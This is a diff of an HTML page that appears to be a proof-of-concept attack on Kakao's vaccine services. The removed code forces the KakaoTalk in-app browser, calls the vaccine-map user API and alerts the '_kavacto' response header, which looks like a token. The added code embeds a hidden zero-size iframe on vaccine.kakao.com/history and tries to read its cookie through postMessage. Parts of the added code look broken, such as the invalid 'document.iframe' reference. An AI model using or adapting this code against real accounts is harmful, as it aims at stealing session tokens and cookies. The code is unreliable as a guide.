@@ -10,46 +10,15 @@
 			  crossorigin="anonymous"></script>
     </head>
     <body>
+        <iframe title="" src="https://vaccine.kakao.com/history" width="0" height="0"></iframe>
         <script type="text/javascript">
             (function ($) {
-                function getResponseHeaders(jqXHR){
-                    jqXHR.responseHeaders = {};
-                    var headers = jqXHR.getAllResponseHeaders();
-                    headers = headers.split("\n");
-                    headers.forEach(function (header) {
-                      header = header.split(": ");
-                      var key = header.shift();
-                      if (key.length == 0) return
-                      // chrome60+ force lowercase, other browsers can be different
-                      key = key.toLowerCase();
-                      jqXHR.responseHeaders[key] = header.join(": ");
-                    });
-                }
-                var ua = navigator.userAgent;
-                if (ua.indexOf("KAKAOTALK ") === -1) {
-                    window.location.href = "kakaotalk://con/web?url=" + encodeURIComponent(window.location.href);
-                    return;
-                }
-                $.ajaxPrefilter(function (options, originalOptions, jqXHR) {
-                    jqXHR.done(function (results, responseText, jqXHR) {
-                        getResponseHeaders(jqXHR);
-                    })
+                window.addEventListener('message', function (e) {
+                    alert(e.data);
                 })
-
-                document.write('1')
-
-                // call vaccine-map user api
-                $.ajax("https://vaccine-map.kakao.com/api/v1/user")
-                    .done(function (response, textStatus, jqXHR) {
-                        document.write('2')
-
-                        alert(jqXHR.responseHeaders['_kavacto']);
-                    })
-                    .fail(function (jqXHR) {
-                        document.write('3')
-
-                        alert('fail');
-                    })
+                document.iframe.addEventListener('load', function (e) {
+                    e.target.parent.postMessage(e.target.document.cookie);
+                });
 
             })(window.jQuery);
         </script>
